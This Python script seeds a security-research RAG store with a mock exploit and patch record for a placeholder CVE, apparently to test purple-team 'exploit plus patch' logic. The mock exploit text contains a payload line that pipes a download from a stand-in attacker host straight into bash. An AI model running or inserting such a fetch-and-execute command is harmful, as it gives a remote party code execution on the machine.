import os
import sys
import logging
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).parent.parent.parent))

from server.utils.research_rag import ResearchRAG, RepoConfig
from server.utils.knowledge_registry import KnowledgeRegistry

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("bootstrap_knowledge")

def bootstrap():
    """
    Populates the ResearchRAG with mock and real data to verify Purple Engine logic.
    """
    logger.info("🚀 Starting Purple Engine Knowledge Bootstrap...")
    
    rag = ResearchRAG()
    registry = KnowledgeRegistry()
    
    # 1. Clear existing (optional, but good for fresh start)
    # rag.clear()
    
    # 2. Inject Mock Test Case: CVE-2024-1234
    # This proves the 'Purple Loop' logic gate: Exploit + Patch = Verified Fix Path
    logger.info("💉 Injecting Mock Test Case: CVE-2024-1234...")
    
    exploit_content = """
    # Exploit PoC for CVE-2024-1234
    Target: Example App v1.0
    Vulnerability: Remote Code Execution via insecure sink.
    Payload: `curl http://attacker.com/shell | bash`
    Sink: app/controllers/upload_controller.py:process_file
    """
    
    patch_content = """
    # Security Patch for CVE-2024-1234
    Fixing RCE in file processing.
    The vulnerable sink was identified in app/controllers/upload_controller.py.
    Modified process_file() to include strict input validation.
    Vulnerable function: upload_controller.py:process_file
    """
    
    rag.add_document(
        content=exploit_content,
        source="internal_research",
        source_type="mock_poc",
        title="CVE-2024-1234 Exploit PoC",
        tags=["cve-2024-1234", "exploit", "rce"]
    )
    
    rag.add_document(
        content=patch_content,
        source="internal_research",
        source_type="mock_patch",
        title="CVE-2024-1234 Security Patch",
        tags=["cve-2024-1234", "patch", "fix"]
    )
    
    # 3. Sync one real repo (Lightweight seed)
    # We'll use a small repo from the defaults or a custom one
    logger.info("📂 Syncing real research seeds...")
    
    # Just sync the first default repo as a proof of concept
    if rag.DEFAULT_REPOS:
        first_repo = rag.DEFAULT_REPOS[0]
        logger.info(f"Syncing {first_repo.name}...")
        rag.sync_repo(first_repo)

    # 4. Final Stats
    logger.info("📊 Bootstrap Complete. Final Stats:")
    logger.info(f"Registry Stats: {registry.get_stats()}")
    logger.info(f"RAG Detail Stats: {rag.get_stats()}")

if __name__ == "__main__":
    bootstrap()
